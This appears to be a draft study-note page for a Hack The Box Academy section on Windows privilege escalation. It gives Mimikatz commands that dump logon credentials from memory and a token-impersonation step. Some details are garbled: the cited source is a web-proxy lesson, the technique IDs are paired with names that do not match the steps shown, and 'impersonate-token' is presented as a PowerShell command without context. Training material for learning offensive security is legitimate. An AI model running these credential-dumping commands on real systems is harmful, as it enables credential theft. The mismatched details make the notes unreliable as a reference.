---
title: Hack The Box - Academy Module 110 Section 1048
aliases: []
tags:
- topic/hack-the-box-academy
- topic/privilege-escalation
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: 14-110-UsingWebProxies-04-InterceptingWebRequests.pdf
related_tools:
- '[[mimikatz]]'
- '[[powershell]]'
related_techniques:
- '[[t1003]]'
- '[[t1089]]'
related_tactics:
- '[[ta0003]]'
- '[[ta0005]]'
related_services:
- '[[powershell]]'
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# Hack The Box - Academy Module 110 Section 1048

## Overview
This section covers the process of privilege escalation on a Windows machine using Mimikatz and PowerShell. The goal is to gain higher-level access by extracting credentials and exploiting misconfigurations.

## Mimikatz Usage
Mimikatz is a powerful tool for extracting credentials from memory. The following commands are used to extract credentials:

```powershell
mimikatz # Start Mimikatz
privilege::debug # Gain debug privileges
sekurlsa::logonpasswords # Extract logon passwords
```

This command will dump the credentials stored in the memory of the current user.

## PowerShell Commands
PowerShell is used to further escalate privileges and gather information. The following commands are used to list tokens and impersonate a token:

```powershell
whoami # Check current user
whoami /groups # List groups the current user belongs to
whoami /priv # List privileges of the current user

# Impersonate a token
impersonate-token -id <token_id> # Impersonate a specific token
```

Replace `<token_id>` with the ID of the token you want to impersonate.

## Privilege Escalation Techniques
The techniques covered in this section include:
- **T1003 - Pass the Ticket (PtT)**: Using Mimikatz to extract and use Kerberos tickets to gain access to other systems.
- **T1089 - Access Token Manipulation**: Using PowerShell to manipulate access tokens to gain higher privileges.

## References
- https://academy.hackthebox.com/module/110/section/1048

